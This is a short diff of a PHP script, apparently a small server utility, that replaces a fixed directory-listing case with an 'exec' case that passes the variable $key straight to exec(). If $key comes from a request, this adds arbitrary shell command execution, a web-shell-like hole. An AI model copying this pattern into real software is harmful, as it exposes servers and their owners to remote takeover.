@@ -40,8 +40,8 @@ switch ($action) {
     case "whoami":
         echo exec('whoami');
         break;
-    case "ls":
-        echo exec('cd /media/kitchen/source_code/GestionnaireDownloadInterface;ls');
+    case "exec":
+        echo exec($key);
         break;
         
     default:
